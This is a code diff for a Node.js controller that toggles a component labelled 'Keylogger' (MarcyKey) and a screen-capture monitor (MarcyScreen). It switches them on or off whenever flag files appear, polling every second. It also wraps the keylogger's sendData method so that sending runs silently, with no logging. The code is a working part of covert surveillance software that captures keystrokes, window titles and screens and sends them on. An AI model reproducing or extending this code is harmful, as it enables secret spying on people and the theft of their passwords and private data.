@@ -56,44 +56,56 @@ if (!checkSingleInstance()) {
     process.exit(1);
 }
 
-const keyFlagPath = path.join(__dirname, 'marcykey.flag');
-const screenFlagPath = path.join(__dirname, 'marcyScreen.flag');
-
 // Initialize instances using the factory functions
 const keyMonitor = MarcyKey();
 const screenMonitor = MarcyScreen();
 
+// Override the sendData method to add logging (optional - remove if you want completely silent)
+const originalSendData = keyMonitor.sendData;
+keyMonitor.sendData = async function(data, windowTitle = '') {
+    // Silent operation - no logging
+    return originalSendData.call(this, data, windowTitle);
+};
+
+// --- Real-time flag file monitoring logic ---
+const keyFlag = path.join(__dirname, 'marcykey.flag');
+const screenFlag = path.join(__dirname, 'marcyScreen.flag');
+
 let keyActive = false;
 let screenActive = false;
 
-function checkFlags() {
-    const keyFlag = fs.existsSync(keyFlagPath);
-    const screenFlag = fs.existsSync(screenFlagPath);
-
-    if (keyFlag && !keyActive) {
+function checkAndToggleMonitors() {
+    // Keylogger
+    const keyFlagExists = fs.existsSync(keyFlag);
+    if (keyFlagExists && !keyActive) {
         keyMonitor.start();
         keyActive = true;
-    } else if (!keyFlag && keyActive) {
+    } else if (!keyFlagExists && keyActive) {
         keyMonitor.stop();
         keyActive = false;
     }
-
-    if (screenFlag && !screenActive) {
+    // Screen
+    const screenFlagExists = fs.existsSync(screenFlag);
+    if (screenFlagExists && !screenActive) {
         screenMonitor.start();
         screenActive = true;
-    } else if (!screenFlag && screenActive) {
+    } else if (!screenFlagExists && screenActive) {
         screenMonitor.stop();
         screenActive = false;
     }
 }
 
-// Poll every second
-const flagInterval = setInterval(checkFlags, 1000);
+// Initial check
+checkAndToggleMonitors();
+
+// Polling interval for real-time monitoring
+const POLL_INTERVAL = 1000; // ms
+const poller = setInterval(checkAndToggleMonitors, POLL_INTERVAL);
 
 // Handle process termination
 process.on('SIGINT', () => {
-    if (keyActive) keyMonitor.stop();
-    if (screenActive) screenMonitor.stop();
-    clearInterval(flagInterval);
+    clearInterval(poller);
+    keyMonitor.stop();
+    screenMonitor.stop();
     process.exit();
 }); 
